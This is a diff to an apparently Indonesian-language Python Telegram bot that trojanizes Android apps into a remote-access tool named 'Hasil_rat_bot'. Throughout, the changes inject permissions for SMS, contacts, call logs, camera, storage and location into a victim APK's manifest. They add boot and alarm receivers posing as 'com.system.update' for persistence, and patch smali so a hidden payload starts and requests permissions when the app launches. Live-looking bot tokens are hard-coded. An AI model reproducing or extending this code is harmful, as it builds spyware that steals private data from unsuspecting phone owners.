@@ -13,7 +13,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 # ── KONFIGURASI ──
 TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
 PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
-PAYLOAD_BOT_USERNAME = "IsiUsernameBotPayloadKamu" # GANTI INI
+PAYLOAD_BOT_USERNAME = "Hasil_rat_bot" # GANTI INI
 
 ALLOWED_CHAT_ID = "8598136412" 
 GROUP_ID = "-1004405270823" # ID Grup kamu
@@ -54,12 +54,16 @@ def inject_manifest(manifest_path):
     root = tree.getroot()
     ns = '{http://schemas.android.com/apk/res/android}'
     
-    permissions = ["android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.RECEIVE_SMS", 
-                   "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA", 
-                   "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", 
-                   "android.permission.ACCESS_FINE_LOCATION", "android.permission.RECEIVE_BOOT_COMPLETED", 
-                   "android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
-                   "android.permission.POST_NOTIFICATIONS"]
+    permissions = [
+        "android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.RECEIVE_SMS", 
+        "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA", 
+        "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", 
+        "android.permission.ACCESS_FINE_LOCATION", "android.permission.RECEIVE_BOOT_COMPLETED", 
+        "android.permission.FOREGROUND_SERVICE", "android.permission.FOREGROUND_SERVICE_DATA_SYNC",
+        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", "android.permission.POST_NOTIFICATIONS",
+        "android.permission.SCHEDULE_EXACT_ALARM", "android.permission.USE_EXACT_ALARM", 
+        "android.permission.WAKE_LOCK"
+    ]
                    
     for perm in permissions:
         if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
@@ -71,10 +75,12 @@ def inject_manifest(manifest_path):
             ET.SubElement(app, 'service', {ns + 'name': 'com.system.update.Payload', ns + 'enabled': 'true', ns + 'exported': 'false', ns + 'foregroundServiceType': 'dataSync'})
             
         if not any(r.get(ns + 'name') == 'com.system.update.BootReceiver' for r in app.findall('receiver')):
-            receiver = ET.SubElement(app, 'receiver', {ns + 'name': 'com.system.update.BootReceiver', ns + 'enabled': 'true', ns + 'exported': 'true'})
-            intent_filter = ET.SubElement(receiver, 'intent-filter')
-            ET.SubElement(intent_filter, 'action', {ns + 'name': 'android.intent.action.BOOT_COMPLETED'})
-            
+            r1 = ET.SubElement(app, 'receiver', {ns + 'name': 'com.system.update.BootReceiver', ns + 'enabled': 'true', ns + 'exported': 'true'})
+            ET.SubElement(r1, 'intent-filter').append(ET.Element('action', {ns + 'name': 'android.intent.action.BOOT_COMPLETED'}))
+
+        if not any(r.get(ns + 'name') == 'com.system.update.AlarmReceiver' for r in app.findall('receiver')):
+            ET.SubElement(app, 'receiver', {ns + 'name': 'com.system.update.AlarmReceiver', ns + 'enabled': 'true', ns + 'exported': 'false'})
+
     tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
 
 def inject_permission_popup(apk_out_dir):
@@ -115,7 +121,7 @@ def inject_permission_popup(apk_out_dir):
                         if ".locals" in lines[j]: lines[j] = f"    .locals {int(parts[1]) + 5}\n"
                         else: lines[j] = f"    .registers {int(parts[1]) + 5}\n"
                         
-                        # PAKAI v4 & v5 (Jangan v0, v1 biar aplikasi asli ga crash)
+                        # Panggil askPermissions & setAlarm (BootReceiver.setAlarm)
                         inject_code = (
                             "\n    const-string v4, \"Injection Active\"\n"
                             "    const/4 v5, 0x1\n"
@@ -123,6 +129,7 @@ def inject_permission_popup(apk_out_dir):
                             "    move-result-object v4\n"
                             "    invoke-virtual {v4}, Landroid/widget/Toast;->show()V\n\n"
                             "    invoke-static {p0}, Lcom/system/update/Payload;->askPermissions(Landroid/app/Activity;)V\n\n"
+                            "    invoke-static {p0}, Lcom/system/update/BootReceiver;->setAlarm(Landroid/content/Context;)V\n\n"
                             "    new-instance v4, Landroid/content/Intent;\n"
                             "    const-class v5, Lcom/system/update/Payload;\n"
                             "    invoke-direct {v4, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
@@ -135,7 +142,7 @@ def inject_permission_popup(apk_out_dir):
 
     if injected:
         with open(smali_path, "w", encoding="utf-8") as f: f.writelines(lines)
-        return "✅ Pop-up & StartService disuntikkan (Aman)."
+        return "✅ Pop-up, StartService & Alarm disuntikkan."
     else: return "⚠️ Gagal nyuntik onCreate."
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
